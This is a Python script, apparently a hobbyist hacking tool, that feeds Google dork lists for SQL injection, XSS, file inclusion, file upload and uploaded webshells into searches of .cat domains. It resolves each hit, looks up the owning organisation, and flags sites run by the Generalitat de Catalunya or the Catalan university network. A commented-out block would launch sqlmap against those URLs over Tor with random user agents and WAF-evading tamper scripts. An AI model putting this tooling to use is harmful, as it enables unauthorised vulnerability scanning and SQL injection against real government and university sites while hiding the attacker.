#!/bin/env python
# Autor: Socket0x80
# Date: 10/08/2017

# Script for detecting vulnerabilities using Google Dorks

# Modules
# Args
import sys
# Sleeps
import time
# Syscalls
import subprocess
# Regex
import re
# DNS
import socket
import dns.resolver
# HTTP requests
import requests
# Google searchs
from google import search

# Args control
if len(sys.argv) != 2:
	print("""Usage:
	python GoogleDork.py <Results-File>
	example:
	python GoogleDork.py results.txt""")
	sys.exit()

# Banner and Menu
print("""
==================================================
[Socket0x80] - Google Dorks Scanner               
==================================================

Please select what Google Dork do you want to use:
	1) SQL Injection
	2) Cross Site Scripting
	3) File Inclusion
	4) File Upload
	5) Uploaded Webshells
""")

# Menu selection
option = 0
while option !='1' and option !='2' and option !='3' and option !='4' and option !='5':
	option = input()

if option == '1': 
    print('[+] SQLI Google Dorks file selected\n')
    file = "/home/revil/Documentos/Hacking/Coding/Python/Google/CFG/SQLI.list"
elif option == '2':
    print('[+] Cross Site Scripting Google Dorks file selected\n')
    file = "/home/revil/Documentos/Hacking/Coding/Python/Google/CFG/XSS.list"
elif option == '3':
    print('[+] File Inclusion Google Dorks file selected\n')
    file = "/home/revil/Documentos/Hacking/Coding/Python/Google/CFG/FileInclusion.list"
elif option == '4':
    print('[+] File Upload Google Dorks file selected\n')
    file = "/home/revil/Documentos/Hacking/Coding/Python/Google/CFG/FileUpload.list"
elif option == '5':
    print('[+] Uploaded Webshells Google Dorks file selected\n')
    file = "/home/revil/Documentos/Hacking/Coding/Python/Google/CFG/Webshells.list"

# Open input file
f = open (file,'r')

# Read the file line by line
for line in f:
	Dork = line.rstrip('\n')


	google_search = Dork + ' site:.cat'

	

	print('[*] Searching in Google: ' + google_search + '\n')

	for URL in search(google_search, tld='es', lang='es', stop=25):
		print('[+] Found: ' + URL)
		
		# Regex to extract domain name
		Domain = re.search('http.*\.cat' , URL).group(0)
		# Regex to remove '//' from domain name
		Domain = re.sub('^.*//', "", Domain)
		# DNS query
		try:
			IP = socket.gethostbyname(Domain)
		except:
			print('[-] Error: DNS query failed')
			IP = 'Error'
			pass		
		# HTTP request
		try:
			Organization = requests.get('http://ipinfo.io/' + IP).json()['org']
		except:
			print('[-] Error: HTTP request failed')
			Organization = 'Error'
			pass

		# Print information
		print('[+] Domain: '+ Domain)
		print('[+] IP: '+ IP)
		print('[+] Organization: '+ Organization)
		time.sleep(10)		

		if Organization == 'AS13041 Consorci de Serveis Universitaris de Catalunya' or Organization == 'AS21193 Centre de Telecomuncaciones i Tecnologies de la Informacias de la Generalitat de Catalunya' or Organization == 'AS39551 Centre Telecos i TI Generalitat de Catalunya':
			print('[+] Webpage belongs to the Generalitat of Catalunya')
			'''
			print('[+] Do you want to execute sqlmap?[y/n]')
			sqlmap = input()

			if sqlmap == 'y':
				print('[*] Executing sqlmap...')
				time.sleep(5)
				subprocess.call('sqlmap -u "' + URL +'" --level=1 --risk=1 --tor --check-tor --tor-port=9050 --tor-type=SOCKS5 --random-agent --tamper="between,randomcase,space2comment"' , shell=True)
			'''

		print('\n')

		# Save in output file
		g = open(sys.argv[1], 'a')
		g.write(google_search + ';' + URL + ';' + Domain + ';' + IP + ';' + Organization + '\n')
		g.close()

	time.sleep(60)
	print('[*] Waiting 60 seconds to avoid Google captcha...')
	print('\n=============================================\n')

# Close file
f.close()
